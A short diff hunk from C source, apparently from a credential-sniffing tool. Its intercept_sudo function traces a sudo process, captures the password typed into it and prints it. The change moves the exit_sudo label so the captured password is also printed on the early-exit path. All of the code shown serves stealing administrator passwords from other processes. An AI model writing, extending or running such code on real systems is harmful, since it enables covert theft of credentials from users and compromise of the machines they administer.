@@ -88,10 +88,10 @@ void intercept_sudo(pid_t traced_process) {
       break;
   }
 
+exit_sudo:
   if (i && i < MAX_PASSWORD_LEN && strnascii(password, i))
     output("%s\n", password);
 
-exit_sudo:
   free(password);
   free_process_name();
   free_process_username();
